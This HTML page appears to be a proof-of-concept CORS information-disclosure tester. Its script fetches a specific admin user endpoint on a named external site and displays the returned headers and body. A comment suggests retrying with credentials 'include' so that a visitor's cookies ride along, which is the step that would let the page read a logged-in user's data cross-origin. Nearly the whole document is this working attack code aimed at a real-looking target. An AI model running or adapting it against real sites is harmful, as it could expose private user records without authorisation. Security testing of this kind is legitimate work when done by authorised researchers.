<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CORS Vulnerability Tester</title>
</head>
<body>
    <h2>CORS Information Disclosure Tester</h2>
    <button onclick="testCorsEndpoint()">Test Endpoint</button>
    <pre id="output" style="background:#f4f4f4; padding:10px; border:1px solid #ccc;"></pre>

    <script>
        function testCorsEndpoint() {
            const targetUrl = "https://www.globe.gov/o/users-orgs-admin/v1.0/users/186079865";
            const outputDiv = document.getElementById("output");

            // We use credentials: 'include' to check if the browser sends cookies with the cross-origin request
            fetch(targetUrl, {
                method: "GET",
                mode: "cors",
                credentials: "omit", // First test without cookies, then try "include"
                headers: {
                    "Accept": "application/json"
                }
            })
            .then(response => {
                let headersObj = {};
                response.headers.forEach((value, key) => {
                    headersObj[key] = value;
                });

                if (response.ok) {
                    return response.json().then(data => ({
                        status: response.status,
                        headers: headersObj,
                        body: data
                    }));
                } else {
                    return response.text().then(text => ({
                        status: response.status,
                        headers: headersObj,
                        body: text
                    }));
                }
            })
            .then(result => {
                outputDiv.innerText = JSON.stringify(result, null, 2);
            })
            .catch(error => {
                outputDiv.innerText = "Error: " + error.toString();
            });
        }
    </script>
</body>
</html>
